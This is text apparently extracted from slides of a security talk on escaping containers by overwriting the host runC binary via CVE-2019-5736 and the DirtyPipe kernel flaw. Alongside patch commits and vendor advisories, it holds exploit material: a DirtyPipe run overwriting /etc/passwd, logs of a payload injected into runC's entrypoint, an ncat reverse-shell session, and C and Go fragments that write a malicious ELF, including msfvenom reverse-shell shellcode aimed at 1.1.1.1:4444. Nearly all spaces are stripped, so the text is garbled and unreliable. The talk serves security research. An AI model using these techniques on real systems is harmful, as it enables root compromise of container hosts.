https://www.comp.nus.edu.sg/programmes/pg/misc/
Ø
GitHub:brant-ruan
Ø
Blog:blog.wohin.me
Ø
5G
Ø 盟
Ø 
Ø
Metarget
AboutMe
CONTENTS
01
02
04
DirtyPipe
CVE-2019-5736
03
05
runC
src: https://containerd.io/img/architecture.png
故事要从DirtyPipe讲起
01
DirtyPipe (CVE-2022-0847)
TheDirtyPipeVulnerability
MaxKellermann PI:EMAIL
Abstract
ThisisthestoryofCVE-2022-0847,avulnerabilityintheLinuxkernel
since5.8whichallowsoverwritingdatainarbitraryread-onlyfiles.
Thisleadstoprivilegeescalationbecauseunprivilegedprocessescan
injectcodeintorootprocesses.
Itissimilarto CVE-2016-5195DirtyCow butiseasiertoexploit.
Thevulnerability wasfixed inLinux5.16.11,5.15.25and5.10.102.
➜ dpuname-r
5.8.0-050800rc1-generic
➜ dpcat/etc/passwd|head-n1
root:x:0:0:root:/root:/usr/bin/zsh
➜ dp./exploit/etc/passwd1hacked
Itworked!
➜ dpcat/etc/passwd|head-n1
rhacked0:0:root:/root:/usr/bin/zsh
PoC/etc/passwd
➜ ~dockerrundirtypipe:exp-1
[*]exploitingDirtyPipe (CVE-2022-0847)
[+]runC openedforreadingas/proc/self/fd/3
[+]gotentrypoint:0x232390
[*]injectingpayloadintorunC atentrypoint 0x232390
[+]done
shell
➜ ~ncat -klvnp 4444
Ncat:Version7.60(https://nmap.org/ncat )
Ncat:Generatingatemporary1024-bitRSAkey.
Ncat:Listeningon:::4444
Ncat:Listeningon0.0.0.0:4444
Ncat:Connectionfrom192.168.3.101.
Ncat:Connectionfrom192.168.3.101:51995.
exit
Ncat:Connectionfrom192.168.3.101.
Ncat:Connectionfrom192.168.3.101:51998.
python3-c"importpty;pty.spawn('/bin/bash')"
/run/runc/test
...
shell1[ctr]#ls-la/proc/18/fd/4/../../..
total0
...
drwxr-xr-x1rootroot1872Nov2509:22bin
drwxr-xr-x1rootroot552Nov2509:46boot
drwxr-xr-x21rootroot4240Nov2722:09dev
drwxr-xr-x1rootroot4958Nov2814:28etc
drwxr-xr-x1rootroot12Jun1512:20home
drwxr-xr-x1rootroot1572Oct3012:00lib
CVE-2016-9962
Setinit processesasnon-dumpable
WhoC
nsenter:clone/proc/self/exetoavoidexposinghostbinarytocontainer
Therearequiteafewcircumstanceswhere/proc/self/exepointingtoa
prettyimportantcontainerbinaryisa_bad_thing,sotoavoidthiswe
havetomakeacopy(preferablydoingself-clean-upandnotbeing
writeable).
Werequirememfd_create(2)-- thoughthereisanO_TMPFILEfallback--
butwecanalwaysextendthistouseascratchMNT_DETACHoverlayfs or
tmpfs.Themaindownsidetothisapproachisnopage-cachesharingfor
therunc binary(whichoverlayfs wouldgiveus)butthisisfarless
complicated.
Thisisonlydoneduringnsenter sothatithappenstransparentlytothe
Gocode,andanylibcontainer usersbenefitfromit.Thisalsomakes
ExtraFiles and--preserve-fds handlingtrivial(becausewedon'tneedto
worryaboutit).
Fixes:CVE-2019-5736
Co-developed-by:ChristianBrauner 
Signed-off-by:Aleksa PI:EMAIL
nsenter:cloned_binary:trytoro-bind/proc/self/exebeforecopying
Theusageofmemfd_create(2)andothercopyingtechniquesisquite
wasteful,despiteattemptstominimise itwith_LIBCONTAINER_STATEDIR.
memfd_create(2)added~10Mofmemoryusagetothecgroup associatedwith
thecontainer,whichcanresultinsomesetupsgettingOOM'd (orjust
hoggingthehosts'memorywhenyouhavelotsofcreated-but-not-started
containersstickingaround).
Theeasiestwayofsolvingthisisbycreatingaread-onlybind-mountof
thebinary,openingthatread-onlybindmount,andthenumounting itto
ensurethatthehostwon'taccidentallybere-mountedread-write.This
avoidsallcopyingandcleansupnaturallyliketheothertechniques
used.Unfortunately,liketheO_TMPFILEfallback,thisrequiresbeing
abletocreateafileinside_LIBCONTAINER_STATEDIR(sincebind-mounting
overthemostobviouspath-- /proc/self/exe-- isa*verybadidea*).
Unfortunatelydetectingthisisn'tfool-proof-- onasystemwitha
read-onlyrootfilesystem(thatmightbecomeread-writeduring"runc
init"execution),wecannottellwhetherwehavealreadydoneanro
remount.Asapartialmitigation,westorea_LIBCONTAINER_CLONED_BINARY
environmentvariablewhichischecked*alongside*theprotectionbeing
present.
Signed-off-by:Aleksa PI:EMAIL
2019-03-01 v1.0.0-rc7
2019-02-08 v1.0.0-rc7
LXCmemfd
CVE-2019-5736(runC):rexec callersasmemfd
AdamIwaniuk andBorys Popławski discoveredthatanattackercancompromisethe
runC hostbinaryfrominsideaprivilegedrunC container.Asaresult,this
couldbeexploitedtogainrootaccessonthehost.runC isusedasthedefault
runtimeforcontainerswithDocker,containerd,Podman,andCRI-O.
➜ lxc git:(master)tail-n14./src/lxc/rexec.c
/**
*Thisfunctionwillcopyanybinarythatcallsliblxc intoamemoryfileand
*willusethememfd torexecute thebinary.Thisisdonetopreventattacks
*throughthe/proc/self/exesymlink tocorruptthehostbinarywhenhostand
*containerareinthesameusernamespaceorhavesetupanidentityid
*mapping:CVE-2019-5736.
*/
__attribute__((constructor))staticvoidliblxc_rexec(void)
{
if(getenv("LXC_MEMFD_REXEC")&&lxc_rexec("liblxc")){
fprintf(stderr,"Failedtore-executeliblxc viamemoryfiledescriptor\n");
_exit(EXIT_FAILURE);
}
}
Ø runC
Ø runCro mount
Ø runC =>
Ø memfd
Ø ro mount
Ø 呢
常见利用场景与利用手法
03
前提：runC是动态链接的
varpayload="#!/bin/bash\n"+shellCmd
for{
writeHandle,_:=os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd),os.O_WRONLY|os.O_TRUNC,0700)
ifint(writeHandle.Fd())>0{
writeHandle.Write([]byte(payload))
//msfvenom -ax86-plinux/x86/execCMD="id>/tmp/hacked&&hostname>>/tmp/hacked"-felf
constunsignedcharmalicious_elf_bytes[]={
/*0x7f,*/0x45,0x4c,0x46,0x01,0x01,0x01,0x00,0x00,0x00,0x00,0x00,
/*ELF */
};
intmain(intargc,char**argv){
if(write_with_dirtypipe(path,1,malicious_elf_bytes,malicious_elf_bytes_size)!=0){
runc_fd_read =open("/proc/self/exe",O_RDONLY);
lseek(runc_fd_read,ELF_ENTRYPOINT_OFFSET,SEEK_SET);
nbytes =read(runc_fd_read,&entrypoint,sizeof(entrypoint));
//msfvenom -plinux/x64/shell_reverse_tcp LHOST=1.1.1.1LPORT=4444-fraw|xxd -i
charpayload[]={
0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,
/*payload */
};
write_with_dirtypipe(runc_fd_read,entrypoint,payload,payload_len);
ELF
ELF
DirtyPipe
CVE-2022-0185runC
UAFPipe Buffer Flag
->Dirtypipe
->DirtypiperunC
->
Ø 
Ø payload
Ø runC
Ø runCDirtyPipe
探索更优雅的利用手法
04
ELFELF
➜ file`whichrunc`
/usr/local/sbin/runc:ELF 64-bitLSBexecutable,x86-64,version1(SYSV),
staticallylinked,BuildID[sha1]=0afa4292e5163007028fbde6effb1a2edc1a3f49,forGNU/Linux3.2.0,stripped
➜ xxd `whichrunc`|head-n1
00000000:7f454c46020101000000000000000000.ELF............
src: https://en.wikipedia.org/wiki/Executable_and_Linkable_Format#/media/File:Elf-layout--en.svg
ELF
➜ ~objdump -dj '.text'`whichrunc`|sed-n'13,24p'
0000000000232390:
232390:
31ed
xor
%ebp,%ebp
232392:
4989d1 mov%rdx,%r9
232395:
5e
pop%rsi
232396:
4889e2 mov%rsp,%rdx
232399:
4883e4f0 and$0xfffffffffffffff0,%rsp
23239d:
50
push%rax
23239e:
54
push%rsp
23239f:
4c8d056ac24600
lea0x46c26a(%rip),%r8
2323a6:
488d0df3c14600
lea0x46c1f3(%rip),%rcx
2323ad:
488d3d8cb40600